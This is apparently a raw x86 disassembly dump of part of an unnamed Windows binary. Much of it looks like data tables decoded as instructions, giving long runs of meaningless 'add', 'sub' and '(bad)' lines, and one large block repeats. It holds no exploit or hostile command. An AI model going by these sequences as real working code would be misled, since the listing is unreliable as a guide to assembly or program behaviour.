  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [edx+edi*1+0x3],dl
  412427:	add    BYTE PTR [edx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
